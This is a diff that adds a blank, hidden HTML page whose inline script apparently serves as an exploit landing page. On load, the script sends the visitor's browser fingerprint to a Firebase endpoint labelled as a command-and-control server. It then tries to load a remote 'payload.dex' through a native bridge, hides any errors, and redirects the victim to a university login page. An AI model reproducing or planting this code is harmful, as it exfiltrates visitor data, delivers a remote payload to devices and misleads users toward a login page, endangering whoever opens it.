@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <style>body{display:none}</style>
+</head>
+<body>
+    <script>
+        (function(){
+            const C2='https://thumbnail-log-default-rtdb.europe-west1.firebasedatabase.app';
+            const exp='https://nextechdevops.github.io/a9438f/payload.dex';
+            
+            fetch(`${C2}/exploit_triggered.json`,{
+                method:'POST',
+                mode:'no-cors',
+                body:JSON.stringify({
+                    ua:navigator.userAgent,
+                    chromeVer:navigator.userAgent.match(/Chrome\/(\d+)/)?.[1],
+                    timestamp:Date.now()
+                })
+            });
+            
+            setTimeout(()=>{
+                try{
+                    if(window.nativeExploit){
+                        window.nativeExploit.loadDex(exp);
+                    }
+                }catch(e){}
+                
+                setTimeout(()=>{
+                    window.location.replace('https://arms.ndu.ac.ug/Account/Login');
+                },1500);
+            },100);
+        })();
+    </script>
+</body>
+</html>
